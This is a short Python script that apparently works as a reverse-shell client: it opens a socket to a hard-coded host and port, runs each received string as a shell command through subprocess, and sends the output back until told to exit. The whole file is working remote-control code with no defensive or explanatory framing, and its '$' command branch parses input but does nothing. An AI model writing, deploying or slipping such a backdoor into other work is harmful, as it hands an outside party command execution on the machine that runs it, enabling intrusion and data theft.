import sys,socket,subprocess

# Connect to the main server
server_ip = '10.0.0.54'  
server_port = 9999
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, server_port))

while True:
    try:
        command = client_socket.recv(1024).decode()
        if not command or command.lower() == 'exit':
            sys.exit(0)

        if command.startswith('$'):
            parts = command.split(' ', 1)
            cmd = parts[0]
            arg = parts[1] if len(parts) > 1 else None
        else:
            print(f"Executing command: {command}")
            output = subprocess.getoutput(command)
            client_socket.send(output.encode())

    except Exception as e:
        client_socket.send(f"Error: {e}".encode())
        break

client_socket.close()